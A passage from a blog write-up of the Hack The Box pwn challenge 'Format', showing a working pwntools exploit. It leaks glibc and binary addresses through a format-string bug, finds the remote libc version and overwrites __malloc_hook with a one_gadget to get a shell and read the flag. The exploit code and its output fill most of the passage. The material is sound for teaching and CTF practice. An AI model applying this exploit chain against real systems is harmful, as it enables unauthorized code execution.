</code></pre></div><p>At this point, we can compute the base addresses of Glibc and the binary substracting the leaked values and the corresponding offsets:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'%21$lx'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">_IO_2_1_stderr__addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">(), </span><span class="mtk6">16</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked _IO_2_1_stderr_ address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">_IO_2_1_stderr__addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'%49$lx'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">main_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">(), </span><span class="mtk6">16</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked main() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">main_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">_IO_2_1_stderr__offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1ed5c0</span>
<span class="mtk1">    </span><span class="mtk1">glibc_address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">_IO_2_1_stderr__addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">_IO_2_1_stderr__offset</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">main_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1284</span>
<span class="mtk1">    </span>elf<span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">main_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">main_offset</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span>elf<span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './format'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './format': pid 2797003  
[<span class="code-blue">*</span>] Leaked _IO_2_1_stderr_ address: 0x7ffff7faa5c0
[<span class="code-blue">*</span>] Leaked main() address: 0x555555555284
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7dbd000
[<span class="code-green">+</span>] ELF base address: 0x555555554000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span>
</code></pre></div><p>Since both base addresses end in <code>000</code>, we can believe that are correct. So we can enable ASLR again:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">echo</span> 2 | <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>  
2
</code></pre></div><p>Another way to leak an address within Glibc is to use the Global Offset Table (GOT) as in common Ret2Libc challenges (such as, <a target="_blank" href="../../../picoctf/binary-exploitation/heres-a-libc">Here&rsquo;s a LIBC</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'%7$sAAAA'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span>elf<span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.fgets))</span>
<span class="mtk1">    </span><span class="mtk1">fgets_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">().</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'AAAA'</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>  
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked fgets() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">fgets_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './format'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './format': pid 2846855  
[<span class="code-blue">*</span>] Leaked _IO_2_1_stderr_ address: 0x7f8238c865c0
[<span class="code-blue">*</span>] Leaked main() address: 0x562da7ed8284
[<span class="code-green">+</span>] Glibc base address: 0x7f8238a99000
[<span class="code-green">+</span>] ELF base address: 0x562da7ed7000
[<span class="code-blue">*</span>] Leaked fgets() address: 0x7f8238b1b630
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span>
</code></pre></div><h3 id="finding-remote-glibc-version">Finding remote Glibc version</h3><p>Let&rsquo;s run the exploit in remote as is:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 167.172.52.59:31445
[<span class="code-blue">*</span>] './format'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 167.172.52.59 on port 31445: Done  
[<span class="code-blue">*</span>] Leaked _IO_2_1_stderr_ address: 0x7f583e826680
[<span class="code-blue">*</span>] Leaked main() address: 0x559ac055e284
[<span class="code-green">+</span>] Glibc base address: 0x7f583e6390c0
[<span class="code-green">+</span>] ELF base address: 0x559ac055d000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span>
</code></pre></div><p>We see that the base address of Glibc is not correct. We can use the last three hexadecimal digits of <code>_IO_2_1_stderr_</code> and <code>fgets</code> leaked addresses to find a matching Glibc version in <a target="_blank" href="https://libc.blukat.me">libc.blukat.me</a> (Glibc 2.27):</p><p><img alt="Format 1" src="/images/HTB-Challenges/HTB-Pwn-Format-1.webp"></p><p>Now that we can download the correct Glibc version, we can use <a target="_blank" href="https://github.com/io12/pwninit"><code>pwninit</code></a> to patch the binary and use the remote Glibc version:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwninit</span> --libc <span class="mtku">libc6_2.27-3ubuntu1_amd64.so</span> --bin <span class="mtku">format</span> --no-template
<span class="code-dark-blue">bin</span>: <span class="code-blue">format</span>
<span class="code-dark-yellow">libc</span>: <span class="code-yellow">libc6_2.27-3ubuntu1_amd64.so</span>

<span class="code-green">fetching linker</span>
<span class="code-green">https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1_amd64.deb</span>
<span class="code-yellow">unstripping libc</span>
<span class="code-green">https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1_amd64.deb</span>  
<span class="code-dark-green">setting <span class="code-green">./ld-2.27.so<span class="code-dark-green"> executable</span>
<span class="code-dark-green">symlinking <span class="code-green">libc.so.6<span class="code-dark-green"> -&gt; <span class="code-green">libc6_2.27-3ubuntu1_amd64.so</span>
<span class="code-dark-green">copying <span class="code-green">format<span class="code-dark-green"> to <span class="code-green">format_patched</span>
<span class="code-dark-green">running patchelf on <span class="code-green">format_patched</span>
</code></pre></div><p>At this point, we can use <code>format_patched</code> in our local environment as well.</p><h3 id="getting-rce">Getting RCE</h3><p>Since the binary is fully protected, the way to obtain a shell will be with the arbitrary write primitive that we can get exploiting the Format String vulnerability.</p><p>A nice value to spawn a shell is a <a target="_blank" href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> shell, which is an address of Glibc that spawns a shell under certain conditions:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">one_gadget</span> <span class="mtku">libc6_2.27-3ubuntu1_amd64.so</span>
<span class="rb-purple">0x4f2c5</span> execve("/bin/sh", <span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x40</span>, environ)
<span class="rb-red">constraints</span>:
  <span class="rb-dark-green">rsp</span> & <span class="rb-purple">0xf</span> == 0
  <span class="rb-dark-green">rcx</span> == NULL

<span class="rb-purple">0x4f322</span> execve("/bin/sh", <span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x40</span>, environ)
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x40</span>] == NULL

<span class="rb-purple">0x10a38c</span> execve("/bin/sh", <span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x70</span>, environ)  
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x70</span>] == NULL
</code></pre></div><p>There&rsquo;s a function hook (<code>__malloc_hook</code>) that is called whenever <code>malloc</code> is called. When we want to print so much values using <code>printf</code>, this function will use <code>malloc</code> behind the scenes to allocate memory, so that way we can trigger the <a target="_blank" href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> shell if we modify <code>__malloc_hook</code> to hold that address:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc6_2.27-3ubuntu1_amd64.so</span> | <span class="code-dark-green">grep</span> __malloc_hook
  1132: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 <span class="code-red">__malloc_hook</span>@@GLIBC_2.2.5  
  6652: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 <span class="code-red">__malloc_hook</span>
</code></pre></div><p>For that, we only need to require a lot of memory, for example using <code>"%100000c"</code>, so that <code>malloc</code> is called.</p><p>In order to craft the payload, <a target="_blank" href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> has a great function called <code>fmtstr_payload</code>. We only need to tell the offset where we control values in the stack (6, we saw it at the beginning), and a mapping that holds the address where we want to write to and the value we want to write. Otherwise, a manual Format String exploitation using <code>%n</code> would have been much more tedious. You can find one example on my <a target="_blank" href="../../../../htb/rope#format-string-exploitation">write-up for Rope machine</a> (in x86) or in <a target="_blank" href="../../../picoctf/binary-exploitation/fermat-strings">fermat-strings</a>.</p><p>So, this is the last payload:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">one_gadget_shell_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">4f322</span>
<span class="mtk1">    </span><span class="mtk1">__malloc_hook_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">3ebc30</span>

<span class="mtk1">    </span><span class="mtk1">one_gadget_shell_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc_address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">one_gadget_shell_offset</span>
<span class="mtk1">    </span><span class="mtk1">__malloc_hook_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc_address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">__malloc_hook_offset</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk8">fmtstr_payload</span><span class="mtk1">(</span><span class="mtk6">6</span><span class="mtk1">, {</span><span class="mtk1">__malloc_hook_addr</span><span class="mtk1">: </span><span class="mtk1">one_gadget_shell_addr</span><span class="mtk1">}))</span>  
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">%10000000c</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>We have a shell locally:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './format_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './format_patched': pid 2852164  
[<span class="code-blue">*</span>] Leaked _IO_2_1_stderr_ address: 0x7fef51487680
[<span class="code-blue">*</span>] Leaked main() address: 0x55654d899284
[<span class="code-green">+</span>] Glibc base address: 0x7fef5109b000
[<span class="code-green">+</span>] ELF base address: 0x55654d898000
[<span class="code-blue">*</span>] Leaked fgets() address: 0x7fef51119b20
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
format        ld-2.27.so              libc.so.6
format_patched    libc6_2.27-3ubuntu1_amd64.so  solve.py
</code></pre></div><h2 id="flag">Flag</h2><p>And also remotely:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 167.172.52.59:31445
[<span class="code-blue">*</span>] './format_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Opening connection to 167.172.52.59 on port 31445: Done  
[<span class="code-blue">*</span>] Leaked _IO_2_1_stderr_ address: 0x7f796e4fa680
[<span class="code-blue">*</span>] Leaked main() address: 0x55d17f0be284
[<span class="code-green">+</span>] Glibc base address: 0x7f796e10e000
[<span class="code-green">+</span>] ELF base address: 0x55d17f0bd000
[<span class="code-blue">*</span>] Leaked fgets() address: 0x7f796e18cb20
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
format
run_challenge.sh
<span class="code-red">$</span> cat flag.txt
HTB{mall0c_h00k_f0r_th3_w1n!}
</code></pre></div><p>The full exploit can be found in here: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Format/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a></li><li><a href="#format-string-vulnerability">Format String vulnerability</a></li><li><a href="#format-string-exploitation">Format String exploitation</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#finding-remote-glibc-version">Finding remote Glibc version</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>